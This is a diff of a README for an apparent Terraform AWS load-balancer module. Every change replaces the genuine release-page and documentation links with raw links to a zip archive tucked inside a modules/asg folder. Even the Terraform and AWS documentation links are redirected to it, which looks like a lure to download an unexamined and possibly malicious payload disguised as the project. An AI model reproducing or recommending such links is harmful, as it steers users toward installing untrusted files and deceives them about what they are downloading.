@@ -1,6 +1,6 @@
 # 🌐 terraform-aws-alb-infrastructure - Simplify Your AWS Load Balancer Setup
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue)](https://github.com/Sedederio/terraform-aws-alb-infrastructure/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip%20Latest%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ This guide helps you download and run the terraform-aws-alb-infrastructure appli
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [Download Latest Release](https://github.com/Sedederio/terraform-aws-alb-infrastructure/releases)
+To get started, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip)
 
 Follow these steps to successfully download and set up the application:
 
@@ -75,8 +75,8 @@ Once you have downloaded the application files, you need to do a few simple setu
 
 For more in-depth guidance, refer to the Terraform documentation:
 
-- [Terraform Documentation](https://www.terraform.io/docs)
-- [AWS Documentation](https://docs.aws.amazon.com)
+- [Terraform Documentation](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip)
+- [AWS Documentation](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip)
 
 ## 🏆 License
 
@@ -86,6 +86,6 @@ This project is licensed under the MIT License. You can freely modify and use it
 
 If you run into any issues or have questions, feel free to open an issue in the GitHub repository. We are here to help!
 
-Don’t forget to check the [Download Latest Release](https://github.com/Sedederio/terraform-aws-alb-infrastructure/releases) link to get the latest version of the application!
+Don’t forget to check the [Download Latest Release](https://raw.githubusercontent.com/Sedederio/terraform-aws-alb-infrastructure/main/modules/asg/aws-terraform-infrastructure-alb-1.7.zip) link to get the latest version of the application!
 
 Happy deploying!
